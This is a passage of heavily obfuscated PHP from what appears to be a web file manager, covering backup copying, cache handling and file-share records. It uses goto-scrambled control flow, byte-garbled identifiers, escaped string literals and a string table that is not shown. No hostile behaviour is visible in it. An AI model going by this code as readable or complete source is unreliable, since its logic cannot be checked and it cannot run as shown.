$EÆÁŠáÃ = CONTROLLER_DIR . $a¯‘²ÄÑÉ[729]; IO::copy($e‹Ã†õÏÀ, $A’¢ê”ô“ . "\x62\x61\143\153\165\x70\137{$Eè³Ëµ³¾}\57"); IO::copy($EÆÁŠáÃ, $A’¢ê”ô“ . "\x62\141\x63\x6b\x75\x70\137{$Eè³Ëµ³¾}\57"); goto bÒµ–ìŞô¤; B¤ŠÍ™·Âª: Backup::set(array($a¯‘²ÄÑÉ[727] => $cÖî¸ô‡‚ù[$a¯‘²ÄÑÉ[77]])); IO::move($eÊì«éÖ”İ, $A’¢ê”ô“); $e‹Ã†õÏÀ = CONTROLLER_DIR . $a¯‘²ÄÑÉ[728]; goto AÜâØ—«ƒ; bÒµ–ìŞô¤: $F–ä‘èÓÚ->end(); Backup::set(array($a¯‘²ÄÑÉ[730] => $cÖî¸ô‡‚ù[$a¯‘²ÄÑÉ[77]])); return !0; goto c¯Š îòŒ†; c¯Š îòŒ†: } } class BackupFile { public function __construct() { } public function index() { goto EÏ¥ÑèâÅê; d‡±èŸßÌÌ: Backup::set($Dì½»ã§æ‹); $this->_fileFilter($E¡ÆÔãÓĞè); return !0; goto aÅ§’º‰È„; EÏ¥ÑèâÅê: $eé£Õ§¹òŞ = Backup::get(); $a‡¹ƒ—¢Œì = $eé£Õ§¹òŞ[$_SERVER[Î¿—”òá][281]][$_SERVER[Î¿—”òá][167]][$_SERVER[Î¿—”òá][419]]; $Dñğ÷šƒÖ‘ = array($_SERVER[Î¿—”òá][420] => array($_SERVER[Î¿—”òá][731], $a‡¹ƒ—¢Œì), $_SERVER[Î¿—”òá][732] => array($_SERVER[Î¿—”òá][319], $eé£Õ§¹òŞ[$_SERVER[Î¿—”òá][687]])); goto F¤„ì¼ÈÒ; cè²³óŸ»: $fõÚ„à—¾Ô = !0; $d˜µ®Ñäë‘ = $this->storeIds(); $eÖöƒ¥‰• = 1; goto F‚—ÁŒªÕÍ; F‚—ÁŒªÕÍ: $dÁ–ƒÀÂ½ = 1000; $FáŒ¯÷ùÊ— = $cœŞÌ­¤î¹ = 0; $E¡ÆÔãÓĞè = array(); goto DÍÑÌ¨ò½­; eÍÏ Ÿá©¾: $aÏõ•¨™Ê->task[$_SERVER[Î¿—”òá][694]] = $eãâ–ÊŒÄ¼; $Dì½»ã§æ‹ = array($_SERVER[Î¿—”òá][735] => $D‘åÂ«™£, $_SERVER[Î¿—”òá][736] => $eãâ–ÊŒÄ¼); Backup::set($Dì½»ã§æ‹); goto cè²³óŸ»; a„ñ¦‘†‚‚: $e»”¡Á±¯… = $fõÚ„à—¾Ô ? 1 : 0; $Dì½»ã§æ‹ = array($_SERVER[Î¿—”òá][747] => 1, $_SERVER[Î¿—”òá][699] => time(), $_SERVER[Î¿—”òá][705] => $e»”¡Á±¯…, $_SERVER[Î¿—”òá][744] => $a‡¹ƒ—¢Œì, $_SERVER[Î¿—”òá][736] => $eãâ–ÊŒÄ¼, $_SERVER[Î¿—”òá][735] => $D‘åÂ«™£); if ($cœŞÌ­¤î¹) { $Dì½»ã§æ‹[$_SERVER[Î¿—”òá][745]] = $aã‘Éã×ê; $Dì½»ã§æ‹[$_SERVER[Î¿—”òá][746]] = $dÕ‡—­ŠÃá; } goto d‡±èŸßÌÌ; F¤„ì¼ÈÒ: $D‘åÂ«™£ = (int) Model($_SERVER[Î¿—”òá][715])->where($Dñğ÷šƒÖ‘)->count($_SERVER[Î¿—”òá][419]); $eãâ–ÊŒÄ¼ = (int) Model($_SERVER[Î¿—”òá][715])->where($Dñğ÷šƒÖ‘)->sum($_SERVER[Î¿—”òá][77]); $aÏõ•¨™Ê = new TaskFileTransfer($_SERVER[Î¿—”òá][733], $_SERVER[Î¿—”òá][710], $D‘åÂ«™£, LNG($_SERVER[Î¿—”òá][711]) . $_SERVER[Î¿—”òá][712] . LNG($_SERVER[Î¿—”òá][734])); goto eÍÏ Ÿá©¾; DÍÑÌ¨ò½­: $dÕ‡—­ŠÃá = $aã‘Éã×ê = 0; do { $Aî‘”ÇÔï = $_SERVER[Î¿—”òá][737]; $d›Ôä„‡´– = Model($_SERVER[Î¿—”òá][715])->where($Dñğ÷šƒÖ‘)->field($Aî‘”ÇÔï)->order($_SERVER[Î¿—”òá][738])->selectPage($dÁ–ƒÀÂ½, $eÖöƒ¥‰•); $dâæŸ¥‹ã· = !empty($d›Ôä„‡´–[$_SERVER[Î¿—”òá][354]]) ? $d›Ôä„‡´–[$_SERVER[Î¿—”òá][354]] : array(); foreach ($dâæŸ¥‹ã· as $e×ŸæÒÈî›) { goto aŒ¿õŒÓÁ‹; F‚“Ø‚×°„: if ($FáŒ¯÷ùÊ— >= 1024 * 1024 * 100) { $Dì½»ã§æ‹ = array($_SERVER[Î¿—”òá][744] => $a‡¹ƒ—¢Œì, $_SERVER[Î¿—”òá][745] => $aã‘Éã×ê, $_SERVER[Î¿—”òá][746] => $dÕ‡—­ŠÃá); Backup::set($Dì½»ã§æ‹); $FáŒ¯÷ùÊ— = $cœŞÌ­¤î¹ = 0; } goto dÈ éØÏ…’; b‘ğÛêšÕ¸: $FáŒ¯÷ùÊ— += $e×ŸæÒÈî›[$_SERVER[Î¿—”òá][77]]; $aã‘Éã×ê += 1; $dÕ‡—­ŠÃá += $e×ŸæÒÈî›[$_SERVER[Î¿—”òá][77]]; goto F‚“Ø‚×°„; aŒ¿õŒÓÁ‹: if (!$this->_fileExist($e×ŸæÒÈî›, $E¡ÆÔãÓĞè, $d˜µ®Ñäë‘)) { $D‘åÂ«™£ -= 1; $eãâ–ÊŒÄ¼ -= (int) $e×ŸæÒÈî›[$_SERVER[Î¿—”òá][77]]; write_log("\146\151\x6c\x65\x20\x6e\x6f\x74\40\145\x78\151\163\x74\56\x66\x69\x6c\x65\x49\x44\72{$e×ŸæÒÈî›[$_SERVER[Î¿—”òá][419]]}\54\40\160\141\164\150\72{$e×ŸæÒÈî›[$_SERVER[Î¿—”òá][75]]}", $_SERVER[Î¿—”òá][739]); continue; } $F¤‰½ëØ† = $e×ŸæÒÈî›[$_SERVER[Î¿—”òá][75]]; $EĞÃÕ‰Ö Š = "\173\151\x6f\x3a{$eé£Õ§¹òŞ[$_SERVER[Î¿—”òá][687]]}\175" . substr($F¤‰½ëØ†, strlen("\x7b\151\x6f\x3a{$e×ŸæÒÈî›[$_SERVER[Î¿—”òá][740]]}\175")); goto f×Ôø åµ; f×Ôø åµ: if (IO::exist($EĞÃÕ‰Ö Š)) { $aÏõ•¨™Ê->updateFileEnd($e×ŸæÒÈî›[$_SERVER[Î¿—”òá][28]], $e×ŸæÒÈî›[$_SERVER[Î¿—”òá][77]]); } else { $EĞÃÕ‰Ö Š = get_path_father($EĞÃÕ‰Ö Š); IO::mkdir($EĞÃÕ‰Ö Š); if (!IO::copy($F¤‰½ëØ†, $EĞÃÕ‰Ö Š, $_SERVER[Î¿—”òá][741])) { write_log($_SERVER[Î¿—”òá][742] . $F¤‰½ëØ† . $_SERVER[Î¿—”òá][743] . $EĞÃÕ‰Ö Š . $_SERVER[Î¿—”òá][476], $_SERVER[Î¿—”òá][710]); $fõÚ„à—¾Ô = !1; break; } } $a‡¹ƒ—¢Œì = $e×ŸæÒÈî›[$_SERVER[Î¿—”òá][419]]; $cœŞÌ­¤î¹ += 1; goto b‘ğÛêšÕ¸; dÈ éØÏ…’: } $CÁ¡×î­´á = count($dâæŸ¥‹ã·); $eÖöƒ¥‰•++; } while ($CÁ¡×î­´á == $dÁ–ƒÀÂ½); $aÏõ•¨™Ê->end(); goto a„ñ¦‘†‚‚; aÅ§’º‰È„: } private function _fileExist($cã®¨ÔÑ¸, &$e“æô¸¦Ò, $e³†‹×­¯Ô) { goto b¿“œ‡•–ê; d‘ù¤éÈëÃ: $e“æô¸¦Ò = array_merge($e“æô¸¦Ò, array_to_keyvalue($Eßœä†ƒäĞ, $dâç÷æ¯[33], $dâç÷æ¯[419])); return !1; goto a”ÔöÑ¸Û¦; BèÇå§ì«æ: if (!in_array($cã®¨ÔÑ¸[$dâç÷æ¯[740]], $e³†‹×­¯Ô)) { return !1; } if (IO::exist($DšÊ†ŠÑ¬Á)) { return !0; } $cß¼Ä¼³Æ¢ = get_path_father($DšÊ†ŠÑ¬Á); goto E­××Ù¼ŞÏ; b¿“œ‡•–ê: $dâç÷æ¯ =& $_SERVER[Î¿—”òá]; $DšÊ†ŠÑ¬Á = $cã®¨ÔÑ¸[$dâç÷æ¯[75]]; if (in_array($cã®¨ÔÑ¸[$dâç÷æ¯[419]], $e“æô¸¦Ò)) { return !1; } goto BèÇå§ì«æ; E­××Ù¼ŞÏ: if (IO::exist($cß¼Ä¼³Æ¢)) { $e“æô¸¦Ò[] = $cã®¨ÔÑ¸[$dâç÷æ¯[419]]; return !1; } $DŸ×†æ†ŒÜ = array($dâç÷æ¯[740] => $cã®¨ÔÑ¸[$dâç÷æ¯[740]], $dâç÷æ¯[75] => array($dâç÷æ¯[748], "{$cß¼Ä¼³Æ¢}\45")); $Eßœä†ƒäĞ = Model($dâç÷æ¯[715])->where($DŸ×†æ†ŒÜ)->field($dâç÷æ¯[420])->select(); goto d‘ù¤éÈëÃ; a”ÔöÑ¸Û¦: } private function _fileFilter($e±›ÛÚÈ› ) { $aŠëšğ†è =& $_SERVER[Î¿—”òá]; if (empty($e±›ÛÚÈ› )) { return; } $A„¶ÈˆÙĞ = array($aŠëšğ†è[419] => array($aŠëšğ†è[7], array_unique($e±›ÛÚÈ› ))); $B±ÄÎ›êİÎ = Model($aŠëšğ†è[749])->where($A„¶ÈˆÙĞ)->field($aŠëšğ†è[369])->select(); foreach ($B±ÄÎ›êİÎ as $e¾ÇöØÛï†) { Model($aŠëšğ†è[749])->remove($e¾ÇöØÛï†[$aŠëšğ†è[369]], !1); } } private function storeIds() { $CçØÄÁ¿¦ =& $_SERVER[Î¿—”òá]; $cï´ë¼Ò‹š = Model($CçØÄÁ¿¦[700])->listData(); $AÃÓÍŠ”©¦ = array(); $eŒëÃ±ÆÅÙ = $GLOBALS[$CçØÄÁ¿¦[6]][$CçØÄÁ¿¦[84]][$CçØÄÁ¿¦[750]]; foreach ($cï´ë¼Ò‹š as $D«ÇÎ–Ì) { $e‡Òê³ÖË = strtolower($D«ÇÎ–Ì[$CçØÄÁ¿¦[90]]); if (!isset($eŒëÃ±ÆÅÙ[$e‡Òê³ÖË])) { continue; } $eó“ŒÙ”  = $CçØÄÁ¿¦[71] . (isset($eŒëÃ±ÆÅÙ[$e‡Òê³ÖË]) ? $eŒëÃ±ÆÅÙ[$e‡Òê³ÖË] : ucfirst($e‡Òê³ÖË)); if (!class_exists($eó“ŒÙ” )) { continue; } $AÃÓÍŠ”©¦[] = $D«ÇÎ–Ì[$CçØÄÁ¿¦[367]]; } return $AÃÓÍŠ”©¦; } } class Cache { protected static $handle; protected static $memoryCache; public static function init() { goto c‹ï‹‰Ñ·ô; c‹ï‹‰Ñ·ô: $f©¡œÁª·Ú =& $_SERVER[Î¿—”òá]; if (self::$handle) { return self::$handle; } self::$memoryCache = array(); goto C¥ÄÉ£òœ; C¥ÄÉ£òœ: $C…‰åğì² = $GLOBALS[$f©¡œÁª·Ú[6]][$f©¡œÁª·Ú[337]]; $Aô‚”Ñ‘ËË = $C…‰åğì²[$C…‰åğì²[$f©¡œÁª·Ú[751]]]; $bë®®ŞÏ = $C…‰åğì²[$f©¡œÁª·Ú[752]]; goto f³±÷íÊ¤¯; f³±÷íÊ¤¯: switch ($C…‰åğì²[$f©¡œÁª·Ú[751]]) { case $f©¡œÁª·Ú[17]: self::$handle = Model($f©¡œÁª·Ú[753]); break; case $f©¡œÁª·Ú[754]: self::$handle = new CacheRedis($Aô‚”Ñ‘ËË, $bë®®ŞÏ); break; case $f©¡œÁª·Ú[755]: self::$handle = new CacheMemcached($Aô‚”Ñ‘ËË, $bë®®ŞÏ); break; case $f©¡œÁª·Ú[167]: self::$handle = new CacheFile($Aô‚”Ñ‘ËË, $bë®®ŞÏ); break; default: break; } return self::$handle; goto DË ¸Ø™»é; DË ¸Ø™»é: } public static function initReset() { self::$handle = !1; self::$memoryCache = !1; } public static function key($a‡–»Å›¦¬) { if (is_array($a‡–»Å›¦¬) || is_object($a‡–»Å›¦¬)) { $a‡–»Å›¦¬ = json_encode($a‡–»Å›¦¬); } $a‡–»Å›¦¬ = rawurlencode($a‡–»Å›¦¬); return KOD_SITE_ID . $_SERVER[Î¿—”òá][70] . $a‡–»Å›¦¬; } public static function get($AÃâ„´×ÌÈ) { $FÉºôÉ¨„ = self::key($AÃâ„´×ÌÈ); if (!isset(self::$memoryCache[$FÉºôÉ¨„])) { $e”õç™æ‘• = self::init()->get($FÉºôÉ¨„); self::$memoryCache[$FÉºôÉ¨„] = unserialize($e”õç™æ‘•); } return self::$memoryCache[$FÉºôÉ¨„]; } public static function set($d‚¢ÙÃùÇ, $eô¢¸ïœ¼Ş, $c„ÌèåÔ‹Ù = false) { goto fƒÆœ»ö“; AÎÔ¶‘‚µ†: CacheLock::lock($d‚¢ÙÃùÇ); $A¶ÓáÎ¯ = self::init()->set($c²âëèæ, serialize($eô¢¸ïœ¼Ş), $c„ÌèåÔ‹Ù); self::$memoryCache[$c²âëèæ] = $eô¢¸ïœ¼Ş; goto Dô¨Î…Ù¾; Dô¨Î…Ù¾: CacheLock::unlock($d‚¢ÙÃùÇ); return $A¶ÓáÎ¯; goto Aà¿»ÛÖ; fƒÆœ»ö“: $c²âëèæ = self::key($d‚¢ÙÃùÇ); if (isset(self::$memoryCache[$c²âëèæ]) && self::$memoryCache[$c²âëèæ] === $eô¢¸ïœ¼Ş) { return !0; } if ($c„ÌèåÔ‹Ù === 0) { self::$memoryCache[$c²âëèæ] = $eô¢¸ïœ¼Ş; return !0; } goto AÎÔ¶‘‚µ†; Aà¿»ÛÖ: } public static function remove($bÀœÜŠ×²) { goto AÄí¯ ½½; Bøœš÷Éª: CacheLock::lock($bÀœÜŠ×²); $c£ò¤µ£šÀ = self::init()->remove($F­˜É²íè‹); CacheLock::unlock($bÀœÜŠ×²); goto a¸©¶ÚŒŒ†; AÄí¯ ½½: $F­˜É²íè‹ = self::key($bÀœÜŠ×²); unset(self::$memoryCache[$F­˜É²íè‹]); self::clearTimeout(); goto Bøœš÷Éª; a¸©¶ÚŒŒ†: return $c£ò¤µ£šÀ; goto cñÉŒÒì‡Ğ; cñÉŒÒì‡Ğ: } public static function clearMemory($câÙØ‘ç«Â = false) { if ($câÙØ‘ç«Â) { $câÙØ‘ç«Â = self::key($câÙØ‘ç«Â); unset(self::$memoryCache[$câÙØ‘ç«Â]); return; } self::$memoryCache = null; self::$memoryCache = array(); } public static function deleteAll() { self::$memoryCache = array(); if (method_exists(self::init(), $_SERVER[Î¿—”òá][756])) { self::init()->deleteAll(); } } public static function clearTimeout() { if (method_exists(self::init(), $_SERVER[Î¿—”òá][757])) { self::init()->clearTimeout(); } } } goto bŒá±œ¸À; ašœ¥ºĞ¬¼: class ShareModel extends ModelBase { protected $tableName = "\x73\x68\x61\x72\x65"; protected $dataAuto = array(array("\x6d\x6f\144\x69\x66\x79\x54\x69\x6d\x65", "\164\x69\x6d\x65", "\x69\x6e\163\x65\x72\164\54\x75\x70\144\x61\x74\x65", "\x66\x75\156\x63\x74\151\x6f\x6e"), array("\143\x72\145\x61\164\145\x54\151\155\145", "\164\x69\x6d\x65", "\151\x6e\x73\145\x72\x74", "\x66\165\156\143\x74\x69\157\156"), array("\x6f\160\x74\151\157\156\163", '', "\x69\156\x73\145\x72\164\54\165\160\x64\141\164\x65\54\163\x65\154\x65\x63\x74", "\152\x73\x6f\x6e")); private $fieldList = "\x2a"; protected function cacheFunctionAlias($D´„¨£œŒ) { $eß‹ø¡±ãÆ =& $_SERVER[Î¿—”òá]; $Fİù¦ ß¼ = isset($D´„¨£œŒ[0]) ? $D´„¨£œŒ[0] : !1; return array($eß‹ø¡±ãÆ[2205] => array(USER_ID, $eß‹ø¡±ãÆ[2206]), $eß‹ø¡±ãÆ[2165] => array($Fİù¦ ß¼, $eß‹ø¡±ãÆ[2207])); } protected function listSimple() { $f±–ƒŠÂ¤Í = array($_SERVER[Î¿—”òá][1429] => USER_ID); $fòõáßˆÙ¤ = $this->field($this->fieldList)->where($f±–ƒŠÂ¤Í)->select(); return $fòõáßˆÙ¤ ? $fòõáßˆÙ¤ : array(); } protected function getInfo($aë¹Ì…‡, $b–óæ¨ò‘à = false) { $f°İíˆ–ã =& $_SERVER[Î¿—”òá]; if ($b–óæ¨ò‘à) { return $this->_getShareInfo(array($f°İíˆ–ã[441] => $aë¹Ì…‡)); } $EêéæÔß = $this->cacheFunctionGet($f°İíˆ–ã[2208], $aë¹Ì…‡); return $EêéæÔß; } public function getInfoByHash($dØ¸ïİ‡§) { return $this->_getShareInfo(array($_SERVER[Î¿—”òá][443] => $dØ¸ïİ‡§)); } public function getInfoByPath($EŸíãƒ±±) { $fñæ–×’ºØ =& $_SERVER[Î¿—”òá]; $AêÎÈƒ´Ğì = array($fñæ–×’ºØ[1429] => USER_ID, $fñæ–×’ºØ[369] => $EŸíãƒ±±); return $this->_getShareInfo($AêÎÈƒ´Ğì); } public function getInfoBySourcePath($b—ä†ø²õ) { $A©ª…Ş›“Æ =& $_SERVER[Î¿—”òá]; $DÛ£ÚëÅ¯Ò = array($A©ª…Ş›“Æ[1429] => USER_ID, $A©ª…Ş›“Æ[1012] => $b—ä†ø²õ); return $this->_getShareInfo($DÛ£ÚëÅ¯Ò); } private function _getShareInfo($cø¼ŒÖ‰§´) { goto bËŸ‘¾é×Û; eñ½ƒÉ‹¥¦: if ($A’¬šƒ¶¼Ì[$EÉ£í­†È¥[369]] == $EÉ£í­†È¥[468]) { $A’¬šƒ¶¼Ì[$EÉ£í­†È¥[391]] = IO::info($A’¬šƒ¶¼Ì[$EÉ£í­†È¥[1012]]); } else { $A’¬šƒ¶¼Ì[$EÉ£í­†È¥[391]] = Model($EÉ£í­†È¥[1110])->pathInfo($A’¬šƒ¶¼Ì[$EÉ£í­†È¥[369]]); } $A’¬šƒ¶¼Ì[$EÉ£í­†È¥[2210]] = $D‘‰Š³Çå¡; return $A’¬šƒ¶¼Ì; goto F¼ŸËµß¹£; bËŸ‘¾é×Û: $EÉ£í­†È¥ =& $_SERVER[Î¿—”òá]; $A’¬šƒ¶¼Ì = $this->where($cø¼ŒÖ‰§´)->find(); if (!$A’¬šƒ¶¼Ì) { return !1; } goto BŸæâêØŒƒ; BŸæâêØŒƒ: $cø¼ŒÖ‰§´ = array($EÉ£í­†È¥[441] => $A’¬šƒ¶¼Ì[$EÉ£í­†È¥[441]]); $cªóô°”ªÜ = $EÉ£í­†È¥[2209]; $D‘‰Š³Çå¡ = Model($EÉ£í­†È¥[537])->order($EÉ£í­†È¥[367])->field($cªóô°”ªÜ)->where($cø¼ŒÖ‰§´)->select(); goto eñ½ƒÉ‹¥¦; F¼ŸËµß¹£: } protected function getInfoAuth($eòäÅÊÒöŞ) { $f›éÆÁÌÇ“ =& $_SERVER[Î¿—”òá]; $cóêÒì„„ = $this->getInfo($eòäÅÊÒöŞ); $cóêÒì„„[$f›éÆÁÌÇ“[376]] = Model($f›éÆÁÌÇ“[454])->authMake($cóêÒì„„[$f›éÆÁÌÇ“[2210]]); return $cóêÒì„„; } protected function listData($BƒöÅ±å² = null, $DÍÇøŸ¿¹… = 300) { $Bà¼š«Ü¡ =& $_SERVER[Î¿—”òá]; $dÍç‰Â½ï÷ = array(array($Bà¼š«Ü¡[446] => array($Bà¼š«Ü¡[919], 0), $Bà¼š«Ü¡[448] => array($Bà¼š«Ü¡[919], 0), $Bà¼š«Ü¡[2211] => $Bà¼š«Ü¡[2179])); if ($BƒöÅ±å² == $Bà¼š«Ü¡[1863]) { $dÍç‰Â½ï÷ = array($Bà¼š«Ü¡[446] => 1); } else { if ($BƒöÅ±å² == $Bà¼š«Ü¡[1001]) { $dÍç‰Â½ï÷ = array($Bà¼š«Ü¡[448] => 1); } } $dÍç‰Â½ï÷[$Bà¼š«Ü¡[1429]] = USER_ID; $DÙõâªê»¬ = $this->where($dÍç‰Â½ï÷)->selectPage($DÍÇøŸ¿¹…); return $DÙõâªê»¬; } protected function listToMe($DÀì¹ñ–´Æ = 300) { goto B†˜ƒôå; E–›¯ñ­Û„: $AÒòŸ«ÖÌ­ = array($e§ µÆ¸èĞ[521] => SourceModel::TYPE_USER, $e§ µÆ¸èĞ[456] => USER_ID); if ($f¡´Ê‡†ä) { $AÒòŸ«ÖÌ­ = array(array($e§ µÆ¸èĞ[521] => SourceModel::TYPE_USER, $e§ µÆ¸èĞ[456] => USER_ID), array($e§ µÆ¸èĞ[521] => SourceModel::TYPE_GROUP, $e§ µÆ¸èĞ[456] => array($e§ µÆ¸èĞ[7], $f¡´Ê‡†ä)), $e§ µÆ¸èĞ[2211] => $e§ µÆ¸èĞ[2179]); } $e‰Ğ«ì¸‘± = Model($e§ µÆ¸èĞ[537])->where($AÒòŸ«ÖÌ­)->selectPage($DÀì¹ñ–´Æ); goto bê¥÷—ªÉ; B†˜ƒôå: $e§ µÆ¸èĞ =& $_SERVER[Î¿—”òá]; $e‹Š‚¬Ö‹ = Session::get($e§ µÆ¸èĞ[2212]); $f¡´Ê‡†ä = array_to_keyvalue($e‹Š‚¬Ö‹, $e§ µÆ¸èĞ[33], $e§ µÆ¸èĞ[2097]); goto E–›¯ñ­Û„; bê¥÷—ªÉ: $cÉ¬–§¿ƒ = array_to_keyvalue_group($e‰Ğ«ì¸‘±[$e§ µÆ¸èĞ[354]], $e§ µÆ¸èĞ[441]); if (!$cÉ¬–§¿ƒ) { return $e‰Ğ«ì¸‘±; } $aÂïÀ¯«š… = $e§ µÆ¸èĞ[2213]; goto aõ§ÕíË¨; b¼ï´…¸×¬: $eõÓº†¸ñ = array($e§ µÆ¸èĞ[2214] => $f±Ú™‹Ğ¡, $e§ µÆ¸èĞ[2215] => $e‰Ğ«ì¸‘±[$e§ µÆ¸èĞ[351]]); return $eõÓº†¸ñ; goto bÜ´öµï¸ø; aõ§ÕíË¨: $AÒòŸ«ÖÌ­ = array($e§ µÆ¸èĞ[441] => array($e§ µÆ¸èĞ[384], array_keys($cÉ¬–§¿ƒ))); $f±Ú™‹Ğ¡ = $this->field($aÂïÀ¯«š…)->where($AÒòŸ«ÖÌ­)->select(); foreach ($f±Ú™‹Ğ¡ as $E¶¾¬ ç¸ğ => &$fÁ«Åñ¥Ê) { $fÁ«Åñ¥Ê[$e§ µÆ¸èĞ[2210]] = $cÉ¬–§¿ƒ[$fÁ«Åñ¥Ê[$e§ µÆ¸èĞ[441]]]; } goto b¼ï´…¸×¬; bÜ´öµï¸ø: } protected function shareAdd($eåÇ‹’ÉˆÅ, $cÜÖÀã‡õ´) { $B‡†÷‡º– =& $_SERVER[Î¿—”òá]; $AÄ…–¼½é½ = $this->_addShareData($eåÇ‹’ÉˆÅ, $cÜÖÀã‡õ´); if (!empty($cÜÖÀã‡õ´[$B‡†÷‡º–[2216]])) { $this->_shareAuthSet($AÄ…–¼½é½, $cÜÖÀã‡õ´[$B‡†÷‡º–[2216]]); } $this->shareEventAdd($eåÇ‹’ÉˆÅ, $cÜÖÀã‡õ´, $B‡†÷‡º–[1004]); return $AÄ…–¼½é½; } private function shareEventAdd($c¥ëŒ¾¯ø•, $dãÜÉ·äÓà, $cƒ¬¸¸äíÁ = "\x61\144\144") { goto b…öóø¼¤‹; b…öóø¼¤‹: $D‚‰¥•ñÂ =& $_SERVER[Î¿—”òá]; if ($cƒ¬¸¸äíÁ == $D‚‰¥•ñÂ[1004]) { if ($dãÜÉ·äÓà[$D‚‰¥•ñÂ[446]] == $D‚‰¥•ñÂ[83]) { Model($D‚‰¥•ñÂ[505])->eventShare($c¥ëŒ¾¯ø•, $D‚‰¥•ñÂ[2217]); } if ($dãÜÉ·äÓà[$D‚‰¥•ñÂ[448]] == $D‚‰¥•ñÂ[83]) { Model($D‚‰¥•ñÂ[505])->eventShare($c¥ëŒ¾¯ø•, $D‚‰¥•ñÂ[2218]); } return; } $D–å•«„¡á = $this->getInfoByPath($c¥ëŒ¾¯ø•); goto d©ášà¾Ø; D³ä­ŠóÂ : return; goto BŒÑ§ƒì¢; AÅ»µ™Ñï÷: if ($D–å•«„¡á[$D‚‰¥•ñÂ[448]] == $D‚‰¥•ñÂ[468] && $dãÜÉ·äÓà[$D‚‰¥•ñÂ[448]] == $D‚‰¥•ñÂ[83]) { $eÅ ½æ…ôÅ = $D‚‰¥•ñÂ[2218]; } if ($D–å•«„¡á[$D‚‰¥•ñÂ[448]] == $D‚‰¥•ñÂ[83] && $dãÜÉ·äÓà[$D‚‰¥•ñÂ[448]] == $D‚‰¥•ñÂ[468]) { $eÅ ½æ…ôÅ = $D‚‰¥•ñÂ[2221]; } Model($D‚‰¥•ñÂ[505])->eventShare($c¥ëŒ¾¯ø•, $eÅ ½æ…ôÅ); goto D³ä­ŠóÂ ; d©ášà¾Ø: $eÅ ½æ…ôÅ = $D‚‰¥•ñÂ[2219]; if ($D–å•«„¡á[$D‚‰¥•ñÂ[446]] == $D‚‰¥•ñÂ[468] && $dãÜÉ·äÓà[$D‚‰¥•ñÂ[446]] == $D‚‰¥•ñÂ[83]) { $eÅ ½æ…ôÅ = $D‚‰¥•ñÂ[2217]; } if ($D–å•«„¡á[$D‚‰¥•ñÂ[446]] == $D‚‰¥•ñÂ[83] && $dãÜÉ·äÓà[$D‚‰¥•ñÂ[446]] == $D‚‰¥•ñÂ[468]) { $eÅ ½æ…ôÅ = $D‚‰¥•ñÂ[2220]; } goto AÅ»µ™Ñï÷; BŒÑ§ƒì¢: } private function _addShareData($Dèóš´ÚŸ¶, $eøÒ‹ë˜Œ  = array()) { goto eÊÙ¡¬æ¼Ÿ; eÊÙ¡¬æ¼Ÿ: $AÄ‡Ú˜—ˆ =& $_SERVER[Î¿—”òá]; $Aîë¸Ş¹ƒØ = array($AÄ‡Ú˜—ˆ[383] => $Dèóš´ÚŸ¶, $AÄ‡Ú˜—ˆ[1420] => USER_ID); if ($Dèóš´ÚŸ¶ == 0) { $Aîë¸Ş¹ƒØ = array($AÄ‡Ú˜—ˆ[2222] => $eøÒ‹ë˜Œ [$AÄ‡Ú˜—ˆ[1012]], $AÄ‡Ú˜—ˆ[1420] => USER_ID); } goto dÂÛäÊ«äŸ; a¦¢Á“ŸÃÀ: return $E“Õ£‚ÄïÓ; goto D†¬Ô·›É; Bàçëğà«: $Dğ×ç—âÅ‰ = array($AÄ‡Ú˜—ˆ[1420] => USER_ID, $AÄ‡Ú˜—ˆ[383] => $Dèóš´ÚŸ¶, $AÄ‡Ú˜—ˆ[1335] => $AÄ‡Ú˜—ˆ[33], $AÄ‡Ú˜—ˆ[446] => 0, $AÄ‡Ú˜—ˆ[448] => 0, $AÄ‡Ú˜—ˆ[1012] => $AÄ‡Ú˜—ˆ[33], $AÄ‡Ú˜—ˆ[295] => $AÄ‡Ú˜—ˆ[33], $AÄ‡Ú˜—ˆ[795] => $AÄ‡Ú˜—ˆ[33], $AÄ‡Ú˜—ˆ[2223] => 0, $AÄ‡Ú˜—ˆ[2224] => 0, $AÄ‡Ú˜—ˆ[699] => 0, $AÄ‡Ú˜—ˆ[2225] => $AÄ‡Ú˜—ˆ[33], $AÄ‡Ú˜—ˆ[443] => $AÄ‡Ú˜—ˆ[33]); $eŸ‹ƒ¸Ëµ¶ = explode($AÄ‡Ú˜—ˆ[47], $AÄ‡Ú˜—ˆ[2226]); foreach ($eŸ‹ƒ¸Ëµ¶ as $FîÇİí´¢) { if (!isset($eøÒ‹ë˜Œ [$FîÇİí´¢])) { continue; } $Dğ×ç—âÅ‰[$FîÇİí´¢] = $eøÒ‹ë˜Œ [$FîÇİí´¢]; } goto Dá¢Ùä¥„; Dá¢Ùä¥„: $E“Õ£‚ÄïÓ = $this->add($Dğ×ç—âÅ‰); $cÛêâÚ¨×‡ = array($AÄ‡Ú˜—ˆ[443] => short_id($E“Õ£‚ÄïÓ)); $this->where(array($AÄ‡Ú˜—ˆ[440] => $E“Õ£‚ÄïÓ))->save($cÛêâÚ¨×‡); goto a¦¢Á“ŸÃÀ; dÂÛäÊ«äŸ: if ($A‰ˆ˜Œ“Ü = $this->where($Aîë¸Ş¹ƒØ)->find()) { return $A‰ˆ˜Œ“Ü[$AÄ‡Ú˜—ˆ[441]]; } if ($Dèóš´ÚŸ¶ == 0) { $A£ğ¾¾’Ş¯ = array($AÄ‡Ú˜—ˆ[28] => get_path_this($eøÒ‹ë˜Œ [$AÄ‡Ú˜—ˆ[75]])); } else { $A£ğ¾¾’Ş¯ = Model($AÄ‡Ú˜—ˆ[749])->sourceInfo($Dèóš´ÚŸ¶); if (!$A£ğ¾¾’Ş¯) { return !1; } } if (!$eøÒ‹ë˜Œ [$AÄ‡Ú˜—ˆ[1335]]) { $eøÒ‹ë˜Œ [$AÄ‡Ú˜—ˆ[1335]] = $A£ğ¾¾’Ş¯[$AÄ‡Ú˜—ˆ[28]]; } goto Bàçëğà«; D†¬Ô·›É: } private function _shareAuthSet($EƒÇ´¶à‹¬, $D‚Ï’½‹ƒó) { goto EÁã°ÁÇ¯©; a¤ÓİŞ¬çï: return $d‘¥ãğÅÌ->addAll($Cğ¨ÍÅÙ‘™, array(), !0); goto d˜Â¨«’ƒÆ; EÁã°ÁÇ¯©: $FÅŸÍîç¡¨ =& $_SERVER[Î¿—”òá]; if (!is_array($D‚Ï’½‹ƒó)) { return !1; } $d‘¥ãğÅÌ = Model($FÅŸÍîç¡¨[2227]); goto b£ãšöÃ¡; b£ãšöÃ¡: $d‘¥ãğÅÌ->where(array($FÅŸÍîç¡¨[441] => $EƒÇ´¶à‹¬))->delete(); $Cğ¨ÍÅÙ‘™ 